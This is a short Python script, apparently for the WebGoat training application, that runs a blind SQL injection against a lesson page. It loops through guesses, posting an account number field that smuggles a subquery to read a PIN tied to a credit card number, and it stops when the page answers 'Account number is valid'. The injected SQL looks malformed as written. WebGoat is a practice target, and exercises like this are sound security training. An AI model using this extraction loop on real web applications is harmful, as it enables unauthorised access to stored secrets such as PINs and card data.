import requests

URL="http://192.168.10.50:8080/WebGoat/attack?Screen=1315528047&menu=1100"
cookie={
    "JSESSIONID":"9B42439A811AF840F234F484CD3580CC"
    }
session1=requests.Session()
num=2000

while True :

    data1={
        'account_number':'101 and select pin from pins where cc_number=1111222233334444='+str(num),
        'SUBMIT':'Go!'      
        }

    res=session1.post(URL, cookies=cookie, data=data1)

    if (res.text.find("Account number is valid") >= 0) :
        print (num)
        exit(0)
    else :
        print ("no... "+str(num))
    num+=1
    
